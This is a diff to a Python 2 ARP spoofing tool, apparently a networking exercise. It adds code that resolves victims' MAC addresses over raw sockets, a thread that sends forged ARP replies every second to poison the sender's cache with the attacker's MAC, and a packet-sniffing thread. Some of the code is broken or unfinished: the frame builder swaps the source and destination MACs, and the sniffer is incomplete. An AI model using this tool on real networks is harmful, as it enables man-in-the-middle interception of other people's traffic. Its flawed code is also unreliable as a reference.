@@ -13,9 +13,13 @@ from socket import *
 execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
 trans_ip = lambda addr : ''.join(map(lambda x:chr(eval(x)), addr.split('.')))
 trans_mac = lambda mac : ''.join(map(lambda x:x.decode('hex'), mac.split(':')))
+reverse_ip = lambda addr : '.'.join(map(lambda x : str(ord(x)), [x for x in addr]))
+reverse_mac = lambda mac : ':'.join(map(lambda x : x.encode('hex'), [x for x in mac]))
 
 p16 = lambda x : struct.pack('>H', x)
 p32 = lambda x : struct.pack('>I', x)
+u16 = lambda x : struct.unpack('>H', x)[0]
+u32 = lambda x : struct.unpack('>I', x)[0]
 
 ip_regex = ('[\d]{1,3}.'*4)[:-1]
 mac_regex = ('[0-9a-f]{2}:'*6)[:-1]
@@ -24,14 +28,12 @@ mac_regex = ('[0-9a-f]{2}:'*6)[:-1]
 Send packet
 '''
 def sendeth(dst, src, type, payload):
-    pkt = trans_mac(dst)
-    pkt += trans_mac(src)
+    pkt = trans_mac(src)
+    pkt += trans_mac(dst)
     pkt += p16(type)
     pkt += payload
-
     s = socket(AF_PACKET, SOCK_RAW)
     s.bind((sys.argv[1], 0))
-    print hexdump(pkt)
     s.send(pkt)
     
 '''
@@ -56,18 +58,15 @@ def make_arp(hwtype, ptype, hwlen, plen, oper, snd_mac, snd_ip, tar_mac, tar_ip)
 '''
 Receive packet
 '''
-def recv_pkt(proto_type):
-    s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+def sniff_pkt(idx):
+    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    idx = 0
     while True:
-        tmp = s.recvfrom(65535)
-        eth_dstmac = tmp[:6]
-        eth_srcmac = tmp[6:12]
-        eth_type = tmp[12:14]
-        if eth_type == ARP:
-            arp_pkt = eth_
-
-        elif eth_type == IP:
-
+        packet = s.recvfrom(65535)
+        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
+        if eth_header[2] == '\x08\x06':
+            arp_header = struct.unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
+             
 
 '''
 Get my mac,ip address 
@@ -90,7 +89,31 @@ def get_macaddr(ip_addr):
     arp_tarip = ip_addr
     pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'req', arp_sndmac, arp_sndip, arp_tarmac, arp_tarip)
     sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
-    recv_pkt()
+
+    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    while True:
+        packet = s.recvfrom(65535)
+        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
+        if eth_header[2] == '\x08\x06': #ETH_TYPE == ARP
+            arp_header = struct.unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
+            if u16(arp_header[4]) == 2: #ARP_OPCODE == REPLY
+                if arp_header[6] == trans_ip(ip_addr):
+                    return reverse_mac(arp_header[5])
+
+'''
+Send arp reply packet to sender.
+'''
+def ARP_reply(idx):
+    while True:
+        try:
+            eth_dstmac = sender_mac[idx]
+            eth_srcmac = my_mac
+            pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'reply', my_mac, target_ip[idx], sender_mac[idx], sender_ip[idx])
+            sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
+            print '[*] ARP reply packet send to {}'.format(sender_ip)
+            sleep(1)
+        except:
+            break
 
 
 if __name__ == '__main__':
@@ -114,12 +137,10 @@ if __name__ == '__main__':
         target_ip.append(sys.argv[2*idx+1])
     my_mac, my_ip = getMyAddr(ifname)
 
-    get_macaddr(sender_ip[0])
-    '''
     print '[+] Get sender, target mac address.'
     for idx in range((len(sys.argv)-2)/2):
-        sender_mac.append(get_macaddr(sender_ip[idx])[0][0][1].src)
-        target_mac.append(get_macaddr(target_ip[idx])[0][0][1].src)
+        sender_mac.append(get_macaddr(sender_ip[idx]))
+        target_mac.append(get_macaddr(target_ip[idx]))
 
     print '[*]', 'INFORMATION'.center(30, '-')
     print 'MY IP'.ljust(14, ' '),': {}'.format(my_ip)
@@ -131,11 +152,17 @@ if __name__ == '__main__':
         print 'TARGET{} IP'.format(idx+1).ljust(14, ' '), ': {}'.format(target_ip[idx])
         print 'TRAGET{} MAC'.format(idx+1).ljust(14, ' '), ': {}'.format(target_mac[idx])
     print '-'*34
-    
+
     for idx in range((len(sys.argv)-2)/2):
-        print '[*] TARGET{} THREAD START!'.format(idx+1)
+        print '[*] TARGET{} ARP_SPOOF THREAD START!'.format(idx+1)
         Thread(target=ARP_reply, args=(idx,)).start() 
 
+    for idx in range((len(sys.argv)-2)/2):
+        print '[*] TARGET{} SNIFFING THREAD START!'.format(idx+1)
+        Thread(target=sniff_pkt, args=(idx,)).start() 
+
     while(1):
-        sleep(5)
-    '''
+        try:
+            sleep(5)
+        except:
+            break
